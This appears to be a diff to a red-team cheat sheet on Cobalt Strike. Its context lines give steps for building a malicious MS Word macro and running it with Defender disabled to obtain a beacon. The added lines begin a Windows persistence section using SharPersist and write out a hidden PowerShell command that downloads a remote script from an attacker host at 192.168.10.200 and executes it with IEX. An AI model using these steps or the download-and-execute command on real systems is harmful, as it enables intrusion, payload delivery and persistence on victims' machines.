@@ -96,3 +96,7 @@
 1. Generate a macro for MS WORD **Attacks -> Packages -> MS Office Macro**
 2. Copy & Paste the macro in the MS Word document (remeber to use **.doc** not the **.docx**
 3. Disable Defender and Run it, you'll get the beacon 
+
+### Persistence for MS Windows via SharPersist
+1. First generate the **x64 powershell** payload by **Attacks -> Web by Delivery -> Scripted Web Del (S)**
+2. E.g. it will be something like ```powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.10.200:80/64bit'))"```
